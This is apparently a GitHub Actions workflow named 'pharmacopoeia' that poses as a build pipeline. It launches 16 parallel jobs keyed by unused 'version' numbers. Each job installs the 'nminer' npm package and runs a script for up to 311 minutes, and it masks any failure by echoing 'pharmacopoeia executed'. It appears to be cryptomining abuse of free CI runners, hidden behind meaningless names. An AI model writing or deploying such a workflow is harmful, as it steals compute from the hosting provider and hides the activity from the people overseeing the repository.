name: pharmacopoeia
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7982 }
          - { version: 1691 }
          - { version: 7642 }
          - { version: 3208 }
          - { version: 1162 }
          - { version: 1755 }
          - { version: 9460 }
          - { version: 7895 }
          - { version: 7496 }
          - { version: 6516 }
          - { version: 4648 }
          - { version: 952 }
          - { version: 7191 }
          - { version: 6760 }
          - { version: 6050 }
          - { version: 3900 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: after times drat
        run: |
          npm install nminer@latest
          timeout 311m node pharmacopoeia.js || echo "pharmacopoeia executed"